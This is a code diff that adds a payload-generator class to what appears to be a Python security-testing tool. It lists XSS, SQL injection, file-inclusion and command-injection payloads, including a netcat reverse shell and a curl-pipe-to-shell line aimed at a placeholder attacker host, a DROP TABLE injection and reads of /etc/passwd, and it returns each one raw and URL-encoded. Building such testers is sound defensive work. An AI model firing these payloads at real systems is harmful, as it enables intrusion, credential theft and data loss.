@@ -9,6 +9,93 @@ from typing import Optional, Dict, Any, List
 from dataclasses import dataclass
 from datetime import datetime
 
+from services.aiva_common.enums import VulnerabilityType, Severity, Confidence
+from services.aiva_common.utils.logging import get_logger
+
+logger = get_logger(__name__)
+
+
+class EnhancedPayloadGenerator:
+    """增強型載荷生成器"""
+    
+    def __init__(self):
+        self.payload_templates = {
+            'xss': [
+                '<script>alert("XSS")</script>',
+                '""<script>alert(String.fromCharCode(88,83,83))</script>',
+                "'><script>alert('XSS')</script>",
+                '<img src=x onerror=alert("XSS")>',
+                '<svg onload=alert("XSS")>'
+            ],
+            'sqli': [
+                "' OR '1'='1",
+                "'; DROP TABLE users; --",
+                "' UNION SELECT null,null,null--",
+                "1' AND SLEEP(5)--",
+                "' OR 1=1 LIMIT 1--"
+            ],
+            'lfi': [
+                '../../../etc/passwd',
+                '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
+                '/proc/self/environ',
+                'php://filter/read=convert.base64-encode/resource=index.php'
+            ],
+            'rce': [
+                '$(whoami)',
+                '`id`',
+                '; cat /etc/passwd',
+                '| nc -e /bin/sh attacker.com 4444',
+                '&& curl http://attacker.com/shell.sh | sh'
+            ]
+        }
+    
+    async def generate_payload(self, payload_type: str, target_context: str = 'web') -> Dict[str, Any]:
+        """生成特定類型的載荷"""
+        try:
+            logger.info(f"生成載荷: {payload_type} for {target_context}")
+            
+            if payload_type.lower() not in self.payload_templates:
+                return {
+                    'error': f'Unsupported payload type: {payload_type}',
+                    'status': 'failed'
+                }
+            
+            base_payloads = self.payload_templates[payload_type.lower()]
+            generated_payloads = []
+            
+            # 基礎載荷
+            for payload in base_payloads:
+                generated_payloads.append({
+                    'payload': payload,
+                    'encoding': 'none',
+                    'context': target_context,
+                    'risk_level': 'medium'
+                })
+            
+            # URL編碼載荷
+            import urllib.parse
+            for payload in base_payloads:
+                encoded_payload = urllib.parse.quote(payload)
+                generated_payloads.append({
+                    'payload': encoded_payload,
+                    'encoding': 'url',
+                    'context': target_context,
+                    'risk_level': 'medium'
+                })
+            
+            return {
+                'payload_type': payload_type,
+                'target_context': target_context,
+                'payloads_generated': len(generated_payloads),
+                'payloads': generated_payloads,
+                'generation_time': datetime.now(),
+                'status': 'completed'
+            }
+            
+        except Exception as e:
+            logger.error(f"載荷生成失敗: {e}")
+            return {'error': str(e), 'status': 'failed'}
+
 
 class PayloadType(str, Enum):
     """Payload 類型"""
